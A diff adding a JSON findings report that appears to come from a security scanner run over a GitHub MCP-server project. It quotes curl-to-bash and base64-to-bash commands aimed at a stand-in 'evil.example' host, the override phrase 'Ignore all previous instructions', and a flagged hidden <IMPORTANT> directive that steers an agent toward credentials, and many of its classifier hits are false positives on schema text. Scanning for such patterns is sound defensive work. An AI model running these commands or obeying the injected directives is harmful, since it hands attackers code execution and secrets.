@@ -1,0 +1,999 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "aisecnomad/Nexus-Symbiote",
+    "version": "44396c2286db37a63daf3766f584dd2c0833ab02",
+    "download": "https://codeload.github.com/aisecnomad/Nexus-Symbiote/tar.gz/44396c2286db37a63daf3766f584dd2c0833ab02"
+  },
+  "archive_sha256": "d9bd57c350c86acd8642d600f16293df7362ef8ab87a3cd34f05a72bd021c242",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/CHANGELOG.md",
+      "line": 10,
+      "evidence": "curl -fsSL https://evil.example/i.sh | bash",
+      "file_sha256": "e76ea16c299a8854b1daa5f02b31127a552e22085a7e0ba628db761a7d4bb6e8"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/CHANGELOG.md",
+      "line": 63,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "e76ea16c299a8854b1daa5f02b31127a552e22085a7e0ba628db761a7d4bb6e8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/fixtures/prompt-bidi/project/CLAUDE.md",
+      "line": 1,
+      "evidence": "\\u{202e}",
+      "file_sha256": "c72449b814281026d4857c3130366c95f135a1530881aef1ec6a6e5b5156e0de"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/corpus-b/cdxgen/aibom-cli/bom.json",
+      "line": 218,
+      "evidence": "\\u{202e}",
+      "file_sha256": "f60950b00650ea27a455e26e798de8bfafc215719cba28d613ecd85be91ca453"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/corpus-b/cdxgen/airgap/bom.json",
+      "line": 218,
+      "evidence": "\\u{202e}",
+      "file_sha256": "49eecfe1c9b66576e8e34785fcc8a2d809927e8587fd92b66b1d9ae1ca98512a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/corpus-b/cdxgen/network/bom.json",
+      "line": 218,
+      "evidence": "\\u{202e}",
+      "file_sha256": "fe60dfa7b3abadd7c319c8ad138852bfe52d42f2721c3a0c63fa530281c0da60"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/corpus-b/cdxgen/repeat/bom.json",
+      "line": 218,
+      "evidence": "\\u{202e}",
+      "file_sha256": "dc5a86b130021768a65ed19a91430a8fd1208b3ae21c89895024d66c4f5dcf38"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/corpus-b/cdxgen-mcp/airgap/bom.json",
+      "line": 256,
+      "evidence": "\\u{202e}",
+      "file_sha256": "603b58d209924dd94409361231e8f04c7a05009fa7b3de2f7de136b658608970"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/corpus-b/cdxgen-mcp/network/bom.json",
+      "line": 256,
+      "evidence": "\\u{202e}",
+      "file_sha256": "086f375a4ff86a172f55c5f1b3b50831db55a7b8ea9c1c0f6e435e96d22d20ef"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/corpus-b/cdxgen-mcp/repeat/bom.json",
+      "line": 256,
+      "evidence": "\\u{202e}",
+      "file_sha256": "a7c017200eec1a9572cdbfb2e9c6d4f7143c8c235bb37356502794f04b6c66a5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/alt/agent-bom-alt/ambient-cwd/stderr",
+      "line": 131,
+      "evidence": "\\u{202e}",
+      "file_sha256": "ec5581b8f27b776ebbf776ea4fccdecb6a6916bb775cbfacfb9be3269606bc85"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/alt/agent-bom-alt/ambient-cwd/report.json",
+      "line": 1,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "161b93ef6056176e89e229d73d372b9ea50663f9797ef2a0a641212a02b5723c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/alt/agent-bom-alt/ambient-cwd/report.json",
+      "line": 1,
+      "evidence": "p=1.00 Detected in SKILL.md: \"Ignore all previous instructions\". Prompt coercion patter",
+      "file_sha256": "161b93ef6056176e89e229d73d372b9ea50663f9797ef2a0a641212a02b5723c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/alt/agent-bom-alt/ambient-cwd/report.json",
+      "line": 1,
+      "evidence": "p=0.91 COPY . . copies the entire build context into the image. Without a .dockerignore",
+      "file_sha256": "161b93ef6056176e89e229d73d372b9ea50663f9797ef2a0a641212a02b5723c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/alt/agent-bom-alt/enterprise-offline/stderr",
+      "line": 130,
+      "evidence": "\\u{202e}",
+      "file_sha256": "939bd618ec8c98587a8a6180bfb1027eadc4e61891b573fa664b5bd97ed8bd0e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/agent-bom/airgap/report.json",
+      "line": 1,
+      "evidence": "p=0.91 COPY . . copies the entire build context into the image. Without a .dockerignore",
+      "file_sha256": "b1a77050d4fa69cdf626997962a20fcf9232a97ea313e01b9f581c3774e18cda"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/agent-bom/network/report.json",
+      "line": 1,
+      "evidence": "p=0.91 COPY . . copies the entire build context into the image. Without a .dockerignore",
+      "file_sha256": "7af57680b93f2a860f58df2a2015c659bc3354b6a9258e8177e8cc7cd5fb3db7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/results/agent-bom/repeat/report.json",
+      "line": 1,
+      "evidence": "p=0.91 COPY . . copies the entire build context into the image. Without a .dockerignore",
+      "file_sha256": "b1a77050d4fa69cdf626997962a20fcf9232a97ea313e01b9f581c3774e18cda"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/ground_truth.json",
+      "line": 200,
+      "evidence": "\\u{202e}",
+      "file_sha256": "1d7dd6dd0793e42dfd4b8a6d696e10d0d7f7098ff2c348ac94261c86db2b4ef3"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/ground_truth.json",
+      "line": 8,
+      "evidence": "p=1.00 Instruction files, prompt templates, inline system prompts and their imports",
+      "file_sha256": "1d7dd6dd0793e42dfd4b8a6d696e10d0d7f7098ff2c348ac94261c86db2b4ef3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/build_corpus.py",
+      "line": 248,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "7925815f99dc76c730c98f88cfff843399b4b06ad48486244a4390ee9c17c57d"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/build_corpus.py",
+      "line": 487,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "7925815f99dc76c730c98f88cfff843399b4b06ad48486244a4390ee9c17c57d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.5.schema.json",
+      "line": 71,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "2d956c1d05c092695457a91f3b5c57c749793c013ec224a0935807cfc8ae4480"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.5.schema.json",
+      "line": 71,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "2d956c1d05c092695457a91f3b5c57c749793c013ec224a0935807cfc8ae4480"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.5.schema.json",
+      "line": 71,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "2d956c1d05c092695457a91f3b5c57c749793c013ec224a0935807cfc8ae4480"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.5.schema.json",
+      "line": 71,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "2d956c1d05c092695457a91f3b5c57c749793c013ec224a0935807cfc8ae4480"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.5.schema.json",
+      "line": 71,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "2d956c1d05c092695457a91f3b5c57c749793c013ec224a0935807cfc8ae4480"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.6.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "18f57f7482593bad9f21b4feed09084640cbeff419d62ad5090c5ceccca5b37d"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/benchmarks/aibom-bench/schemas/bom-1.7.schema.json",
+      "line": 6615,
+      "evidence": "p=0.91 The priorityApplication contains the essential data necessary to identify and re",
+      "file_sha256": "73308edec3ab2d38bfffd993e96a042b594314143b6971a6e9ed98bbb6bd76ce"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 68,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/src/nexus_symbiote/generators/schemas/vendor/cyclonedx/bom-1.7.schema.json",
+      "line": 6615,
+      "evidence": "p=0.91 The priorityApplication contains the essential data necessary to identify and re",
+      "file_sha256": "813b4dec74a3048bdba393e596649500f92ee5d5f43131a082c3b036b1a67fd5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_undecodable_skill_resources.py",
+      "line": 111,
+      "evidence": "curl evil|sh",
+      "file_sha256": "8e21f1f3b48df93f839a054f8e42d7bb652b0e8a96f85bce97694b03c6819e93"
